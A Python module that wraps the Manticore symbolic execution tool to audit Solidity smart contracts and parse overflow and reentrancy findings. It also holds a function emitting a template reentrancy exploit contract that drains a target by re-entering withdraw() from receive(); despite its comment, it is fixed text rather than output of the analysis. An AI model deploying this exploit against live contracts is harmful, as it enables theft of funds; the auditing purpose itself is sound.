"""
Manticore Symbolic Execution Tool Integration
Provides dynamic symbolic execution and exploit generation for Ethereum smart contracts.
"""
import subprocess
import logging
import json
import os
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def run_manticore(contract_path, max_depth=128, timeout=1200, quick_mode=False):
    """
    Run Manticore symbolic execution on a smart contract.

    Args:
        contract_path (str): Path to the Solidity contract file
        max_depth (int): Maximum symbolic execution depth (default: 128)
        timeout (int): Maximum execution time in seconds (default: 1200/20min)
        quick_mode (bool): Use quick mode with reduced exploration

    Returns:
        dict: Manticore analysis results with paths, states, and findings
    """
    try:
        logger.info(f"Running Manticore symbolic execution on {contract_path}")

        # Construir comando
        cmd = ['manticore', contract_path]

        if quick_mode:
            cmd.extend(['--quick-mode'])

        cmd.extend([
            '--max-depth', str(max_depth),
            '--timeout', str(timeout),
            '--verbose-trace'
        ])

        logger.info(f"Command: {' '.join(cmd)}")

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout + 60  # Extra buffer
        )

        output = result.stdout if result.stdout else result.stderr

        # Parsear resultados
        analysis_results = parse_manticore_output(output, contract_path)

        logger.info("Manticore analysis completed")
        return analysis_results

    except subprocess.TimeoutExpired:
        logger.error(f"Manticore analysis timed out after {timeout} seconds")
        return {
            'error': f'Timeout after {timeout}s',
            'status': 'timeout',
            'findings': []
        }
    except FileNotFoundError:
        logger.error("Manticore not found. Please install it first.")
        return {
            'error': 'Manticore not installed',
            'status': 'error',
            'findings': []
        }
    except Exception as e:
        logger.error(f"Error running Manticore: {str(e)}")
        return {
            'error': str(e),
            'status': 'error',
            'findings': []
        }


def parse_manticore_output(output, contract_path):
    """
    Parse Manticore output to extract findings.

    Args:
        output (str): Raw Manticore output
        contract_path (str): Path to analyzed contract

    Returns:
        dict: Structured analysis results
    """
    results = {
        'contract': contract_path,
        'status': 'completed',
        'findings': [],
        'states_explored': 0,
        'paths_explored': 0,
        'coverage': 0.0
    }

    # Buscar workspace de Manticore
    workspace = find_manticore_workspace(contract_path)

    if workspace:
        # Leer resultados del workspace
        results['findings'] = extract_findings_from_workspace(workspace)
        results['states_explored'] = count_states(workspace)

    # Parsear output directo
    for line in output.split('\n'):
        if 'Explored' in line and 'states' in line:
            try:
                results['states_explored'] = int(line.split()[1])
            except:
                pass

        if 'Integer overflow' in line or 'Integer underflow' in line:
            results['findings'].append({
                'type': 'integer_overflow',
                'severity': 'HIGH',
                'description': line.strip()
            })

        if 'Reentrancy' in line:
            results['findings'].append({
                'type': 'reentrancy',
                'severity': 'CRITICAL',
                'description': line.strip()
            })

    return results


def find_manticore_workspace(contract_path):
    """
    Find Manticore workspace directory.

    Args:
        contract_path (str): Path to contract

    Returns:
        str: Path to workspace or None
    """
    contract_name = Path(contract_path).stem
    workspace_pattern = f"mcore_{contract_name}_*"

    # Buscar en directorio actual
    workspaces = list(Path('.').glob(workspace_pattern))

    if workspaces:
        return str(workspaces[0])

    return None


def extract_findings_from_workspace(workspace):
    """
    Extract findings from Manticore workspace.

    Args:
        workspace (str): Path to Manticore workspace

    Returns:
        list: List of findings
    """
    findings = []
    global_findings_file = Path(workspace) / 'global.findings'

    if global_findings_file.exists():
        try:
            with open(global_findings_file, 'r') as f:
                content = f.read()
                # Parsear findings (formato específico de Manticore)
                for line in content.split('\n'):
                    if line.strip() and not line.startswith('#'):
                        findings.append({
                            'description': line.strip(),
                            'severity': 'MEDIUM',
                            'source': 'manticore_workspace'
                        })
        except Exception as e:
            logger.warning(f"Error reading findings: {e}")

    return findings


def count_states(workspace):
    """
    Count explored states in workspace.

    Args:
        workspace (str): Path to workspace

    Returns:
        int: Number of states
    """
    try:
        state_dirs = list(Path(workspace).glob('test_*'))
        return len(state_dirs)
    except:
        return 0


def generate_exploit(contract_path, vulnerability_type='reentrancy'):
    """
    Generate exploit code for a detected vulnerability.

    Args:
        contract_path (str): Path to vulnerable contract
        vulnerability_type (str): Type of vulnerability

    Returns:
        str: Exploit contract code
    """
    if vulnerability_type == 'reentrancy':
        return generate_reentrancy_exploit(contract_path)
    elif vulnerability_type == 'integer_overflow':
        return generate_overflow_exploit(contract_path)
    else:
        return "// Exploit generation not implemented for this vulnerability type"


def generate_reentrancy_exploit(contract_path):
    """Generate reentrancy exploit."""
    contract_name = Path(contract_path).stem

    exploit = f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * @title ReentrancyExploit
 * @notice Exploit contract generated by Manticore
 * @dev FOR EDUCATIONAL PURPOSES ONLY
 */
contract ReentrancyExploit {{
    {contract_name} public target;
    uint256 public attackAmount = 1 ether;

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    function attack() external payable {{
        require(msg.value >= attackAmount, "Need ETH for attack");
        target.deposit{{value: attackAmount}}();
        target.withdraw(attackAmount);
    }}

    receive() external payable {{
        if (address(target).balance >= attackAmount) {{
            target.withdraw(attackAmount);
        }}
    }}

    function getBalance() external view returns (uint256) {{
        return address(this).balance;
    }}
}}
"""
    return exploit


def generate_overflow_exploit(contract_path):
    """Generate integer overflow exploit."""
    return """// Integer overflow exploit
// To be implemented based on specific contract"""


def audit_contract(contract_path, version, quick_mode=False):
    """
    Perform a complete symbolic execution audit using Manticore.

    Args:
        contract_path (str): Path to the Solidity contract file
        version (str): Solidity compiler version (informational)
        quick_mode (bool): Use quick mode for faster analysis

    Returns:
        dict: Complete Manticore analysis results
    """
    logger.info(f"Starting Manticore audit for {contract_path} (Solidity {version})")

    if quick_mode:
        logger.info("Using quick mode (reduced exploration)")
        results = run_manticore(contract_path, max_depth=64, timeout=300, quick_mode=True)
    else:
        results = run_manticore(contract_path)

    logger.info(f"Audit completed: {len(results.get('findings', []))} findings")
    return results


if __name__ == "__main__":
    # Test básico
    import sys

    if len(sys.argv) < 2:
        print("Usage: python manticore_tool.py <contract_path>")
        sys.exit(1)

    contract = sys.argv[1]
    results = audit_contract(contract, "0.8.0", quick_mode=True)

    print("\n=== MANTICORE RESULTS ===")
    print(json.dumps(results, indent=2))
